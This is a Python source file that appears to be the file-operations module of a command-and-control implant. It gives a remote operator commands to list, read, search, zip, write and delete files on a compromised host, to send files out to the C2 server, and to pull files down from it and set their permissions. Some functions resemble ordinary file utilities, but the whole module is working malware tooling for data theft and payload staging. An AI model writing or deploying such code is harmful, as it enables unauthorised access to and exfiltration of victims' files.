# agent/modules/file_operations.py
import os
import shutil
import hashlib
import base64
import zipfile
import tempfile
from typing import Dict, Any, List, Optional
from datetime import datetime


class FileOperations:
    """File operations module"""
    
    def __init__(self, agent):
        self.agent = agent
        self.commands = {
            'list': self.list_files,
            'read': self.read_file,
            'write': self.write_file,
            'delete': self.delete_file,
            'copy': self.copy_file,
            'move': self.move_file,
            'mkdir': self.make_directory,
            'download': self.download_file,
            'upload': self.upload_file,
            'search': self.search_files,
            'hash': self.hash_file,
            'zip': self.zip_files,
            'unzip': self.unzip_file,
            'stat': self.file_stat
        }
    
    def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute file operation"""
        if command in self.commands:
            try:
                result = self.commands[command](parameters)
                return {'success': True, 'result': result}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        else:
            return {'success': False, 'error': f'Unknown command: {command}'}
    
    def list_files(self, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """List files in directory with details"""
        path = params.get('path', '.')
        recursive = params.get('recursive', False)
        pattern = params.get('pattern', '*')
        
        files = []
        
        if recursive:
            # Recursive listing
            for root, dirs, filenames in os.walk(path):
                # Limit depth to prevent excessive recursion
                depth = root[len(path):].count(os.sep)
                if depth > params.get('max_depth', 3):
                    dirs[:] = []  # Don't recurse further
                    continue
                
                for name in filenames:
                    full_path = os.path.join(root, name)
                    if self._match_pattern(name, pattern):
                        files.append(self._get_file_info(full_path))
                
                for name in dirs:
                    full_path = os.path.join(root, name)
                    if self._match_pattern(name, pattern):
                        files.append(self._get_file_info(full_path))
        else:
            # Non-recursive listing
            try:
                for name in os.listdir(path):
                    if self._match_pattern(name, pattern):
                        full_path = os.path.join(path, name)
                        files.append(self._get_file_info(full_path))
            except PermissionError:
                raise Exception(f"Permission denied: {path}")
        
        return files
    
    def _match_pattern(self, name: str, pattern: str) -> bool:
        """Match filename against pattern"""
        if pattern == '*':
            return True
        
        import fnmatch
        return fnmatch.fnmatch(name, pattern)
    
    def _get_file_info(self, path: str) -> Dict[str, Any]:
        """Get file information"""
        try:
            stat = os.stat(path)
            
            return {
                'path': path,
                'name': os.path.basename(path),
                'size': stat.st_size,
                'isDirectory': os.path.isdir(path),
                'isFile': os.path.isfile(path),
                'isLink': os.path.islink(path),
                'permissions': oct(stat.st_mode)[-3:],
                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                'accessed': datetime.fromtimestamp(stat.st_atime).isoformat()
            }
        except:
            return {
                'path': path,
                'name': os.path.basename(path),
                'error': 'Unable to stat file'
            }
    
    def read_file(self, params: Dict[str, Any]) -> str:
        """Read file contents"""
        path = params.get('path')
        if not path:
            raise Exception("Path parameter required")
        
        encoding = params.get('encoding', 'utf-8')
        as_base64 = params.get('base64', False)
        offset = params.get('offset', 0)
        length = params.get('length', -1)
        
        try:
            if as_base64:
                # Read binary and encode as base64
                with open(path, 'rb') as f:
                    if offset > 0:
                        f.seek(offset)
                    
                    if length > 0:
                        data = f.read(length)
                    else:
                        data = f.read()
                    
                    return base64.b64encode(data).decode('utf-8')
            else:
                # Read as text
                with open(path, 'r', encoding=encoding, errors='replace') as f:
                    if offset > 0:
                        f.seek(offset)
                    
                    if length > 0:
                        data = f.read(length)
                    else:
                        data = f.read()
                    
                    return data
                    
        except FileNotFoundError:
            raise Exception(f"File not found: {path}")
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
    
    def write_file(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Write content to file"""
        path = params.get('path')
        content = params.get('content')
        
        if not path or content is None:
            raise Exception("Path and content parameters required")
        
        mode = params.get('mode', 'w')
        encoding = params.get('encoding', 'utf-8')
        from_base64 = params.get('base64', False)
        create_dirs = params.get('create_dirs', False)
        
        # Create parent directories if requested
        if create_dirs:
            os.makedirs(os.path.dirname(path), exist_ok=True)
        
        try:
            if from_base64:
                # Decode base64 and write binary
                data = base64.b64decode(content)
                with open(path, 'wb' if 'b' not in mode else mode) as f:
                    f.write(data)
            else:
                # Write text
                with open(path, mode, encoding=encoding) as f:
                    f.write(content)
            
            # Get file info after writing
            stat = os.stat(path)
            return {
                'path': path,
                'size': stat.st_size,
                'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
            }
            
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
        except Exception as e:
            raise Exception(f"Write failed: {e}")
    
    def delete_file(self, params: Dict[str, Any]) -> str:
        """Delete file or directory"""
        path = params.get('path')
        if not path:
            raise Exception("Path parameter required")
        
        recursive = params.get('recursive', False)
        
        # Safety check - prevent deletion of critical paths
        if self._is_critical_path(path):
            raise Exception("Cannot delete critical system path")
        
        try:
            if os.path.isdir(path):
                if recursive:
                    shutil.rmtree(path)
                    return f"Directory deleted recursively: {path}"
                else:
                    os.rmdir(path)
                    return f"Directory deleted: {path}"
            else:
                os.remove(path)
                return f"File deleted: {path}"
                
        except FileNotFoundError:
            raise Exception(f"Path not found: {path}")
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
        except OSError as e:
            raise Exception(f"Delete failed: {e}")
    
    def _is_critical_path(self, path: str) -> bool:
        """Check if path is critical system path"""
        critical_paths = [
            '/', '/bin', '/boot', '/dev', '/etc', '/lib', '/lib64',
            '/proc', '/root', '/sbin', '/sys', '/usr', '/var',
            'C:\\', 'C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)',
            'C:\\ProgramData', 'C:\\Users\\All Users'
        ]
        
        abs_path = os.path.abspath(path)
        
        for critical in critical_paths:
            if abs_path == critical or abs_path.startswith(critical + os.sep):
                return True
        
        return False
    
    def copy_file(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Copy file or directory"""
        src = params.get('source')
        dst = params.get('destination')
        
        if not src or not dst:
            raise Exception("Source and destination parameters required")
        
        overwrite = params.get('overwrite', False)
        
        try:
            if os.path.isdir(src):
                if os.path.exists(dst) and not overwrite:
                    raise Exception(f"Destination exists: {dst}")
                
                shutil.copytree(src, dst, dirs_exist_ok=overwrite)
            else:
                if os.path.exists(dst) and not overwrite:
                    raise Exception(f"Destination exists: {dst}")
                
                shutil.copy2(src, dst)
            
            return {
                'source': src,
                'destination': dst,
                'size': os.path.getsize(dst) if os.path.isfile(dst) else 0
            }
            
        except FileNotFoundError:
            raise Exception(f"Source not found: {src}")
        except PermissionError as e:
            raise Exception(f"Permission denied: {e}")
    
    def move_file(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Move file or directory"""
        src = params.get('source')
        dst = params.get('destination')
        
        if not src or not dst:
            raise Exception("Source and destination parameters required")
        
        try:
            shutil.move(src, dst)
            
            return {
                'source': src,
                'destination': dst,
                'success': True
            }
            
        except FileNotFoundError:
            raise Exception(f"Source not found: {src}")
        except PermissionError as e:
            raise Exception(f"Permission denied: {e}")
    
    def make_directory(self, params: Dict[str, Any]) -> str:
        """Create directory"""
        path = params.get('path')
        if not path:
            raise Exception("Path parameter required")
        
        parents = params.get('parents', True)
        mode = params.get('mode', 0o755)
        
        try:
            if parents:
                os.makedirs(path, mode=mode, exist_ok=True)
            else:
                os.mkdir(path, mode=mode)
            
            return f"Directory created: {path}"
            
        except FileExistsError:
            raise Exception(f"Directory already exists: {path}")
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
    
    def download_file(self, params: Dict[str, Any]) -> str:
        """Download file from agent to C2"""
        path = params.get('path')
        if not path:
            raise Exception("Path parameter required")
        
        try:
            # Read file
            with open(path, 'rb') as f:
                data = f.read()
            
            # Upload to C2
            filename = os.path.basename(path)
            success = self.agent.comm.upload_file(filename, data)
            
            if success:
                return f"File uploaded: {path} ({len(data)} bytes)"
            else:
                raise Exception("Upload to C2 failed")
                
        except FileNotFoundError:
            raise Exception(f"File not found: {path}")
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
    
    def upload_file(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Upload file from C2 to agent"""
        file_id = params.get('file_id')
        destination = params.get('destination')
        
        if not file_id or not destination:
            raise Exception("file_id and destination parameters required")
        
        # Download from C2
        data = self.agent.comm.download_file(file_id)
        
        if not data:
            raise Exception("Download from C2 failed")
        
        # Write to destination
        try:
            # Create parent directories
            os.makedirs(os.path.dirname(destination), exist_ok=True)
            
            with open(destination, 'wb') as f:
                f.write(data)
            
            # Set permissions if specified
            if 'mode' in params:
                os.chmod(destination, params['mode'])
            
            return {
                'destination': destination,
                'size': len(data),
                'success': True
            }
            
        except PermissionError:
            raise Exception(f"Permission denied: {destination}")
    
    def search_files(self, params: Dict[str, Any]) -> List[str]:
        """Search for files"""
        path = params.get('path', '.')
        pattern = params.get('pattern', '*')
        content = params.get('content')
        max_results = params.get('max_results', 100)
        
        results = []
        count = 0
        
        try:
            for root, dirs, files in os.walk(path):
                for name in files:
                    if count >= max_results:
                        break
                    
                    if self._match_pattern(name, pattern):
                        full_path = os.path.join(root, name)
                        
                        # If content search is requested
                        if content:
                            try:
                                with open(full_path, 'r', errors='ignore') as f:
                                    if content in f.read():
                                        results.append(full_path)
                                        count += 1
                            except:
                                pass
                        else:
                            results.append(full_path)
                            count += 1
                
                if count >= max_results:
                    break
            
            return results
            
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
    
    def hash_file(self, params: Dict[str, Any]) -> Dict[str, str]:
        """Calculate file hashes"""
        path = params.get('path')
        if not path:
            raise Exception("Path parameter required")
        
        algorithms = params.get('algorithms', ['md5', 'sha1', 'sha256'])
        
        try:
            hashes = {}
            
            # Read file in chunks to handle large files
            chunk_size = 8192
            
            for algo in algorithms:
                h = hashlib.new(algo)
                
                with open(path, 'rb') as f:
                    while True:
                        chunk = f.read(chunk_size)
                        if not chunk:
                            break
                        h.update(chunk)
                
                hashes[algo] = h.hexdigest()
            
            return hashes
            
        except FileNotFoundError:
            raise Exception(f"File not found: {path}")
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
    
    def zip_files(self, params: Dict[str, Any]) -> str:
        """Create zip archive"""
        paths = params.get('paths', [])
        output = params.get('output')
        
        if not paths or not output:
            raise Exception("paths and output parameters required")
        
        try:
            with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
                for path in paths:
                    if os.path.isdir(path):
                        # Add directory recursively
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arc_name = os.path.relpath(file_path, os.path.dirname(path))
                                zf.write(file_path, arc_name)
                    else:
                        # Add single file
                        zf.write(path, os.path.basename(path))
            
            return f"Archive created: {output}"
            
        except Exception as e:
            raise Exception(f"Zip creation failed: {e}")
    
    def unzip_file(self, params: Dict[str, Any]) -> List[str]:
        """Extract zip archive"""
        archive = params.get('archive')
        destination = params.get('destination', '.')
        
        if not archive:
            raise Exception("archive parameter required")
        
        try:
            extracted = []
            
            with zipfile.ZipFile(archive, 'r') as zf:
                # Check for zip bombs
                total_size = sum(info.file_size for info in zf.infolist())
                if total_size > 1024 * 1024 * 1024:  # 1GB limit
                    raise Exception("Archive too large (possible zip bomb)")
                
                # Extract files
                for info in zf.infolist():
                    # Sanitize path to prevent directory traversal
                    safe_path = os.path.normpath(info.filename)
                    if os.path.isabs(safe_path) or '..' in safe_path:
                        continue
                    
                    zf.extract(info, destination)
                    extracted.append(os.path.join(destination, info.filename))
            
            return extracted
            
        except FileNotFoundError:
            raise Exception(f"Archive not found: {archive}")
        except Exception as e:
            raise Exception(f"Extraction failed: {e}")
    
    def file_stat(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Get detailed file statistics"""
        path = params.get('path')
        if not path:
            raise Exception("Path parameter required")
        
        try:
            stat = os.stat(path)
            
            info = {
                'path': path,
                'name': os.path.basename(path),
                'size': stat.st_size,
                'mode': oct(stat.st_mode),
                'uid': stat.st_uid,
                'gid': stat.st_gid,
                'atime': datetime.fromtimestamp(stat.st_atime).isoformat(),
                'mtime': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'ctime': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                'isFile': os.path.isfile(path),
                'isDir': os.path.isdir(path),
                'isLink': os.path.islink(path),
                'readable': os.access(path, os.R_OK),
                'writable': os.access(path, os.W_OK),
                'executable': os.access(path, os.X_OK)
            }
            
            # Get link target if symlink
            if os.path.islink(path):
                info['linkTarget'] = os.readlink(path)
            
            return info
            
        except FileNotFoundError:
            raise Exception(f"Path not found: {path}")
        except PermissionError:
            raise Exception(f"Permission denied: {path}")
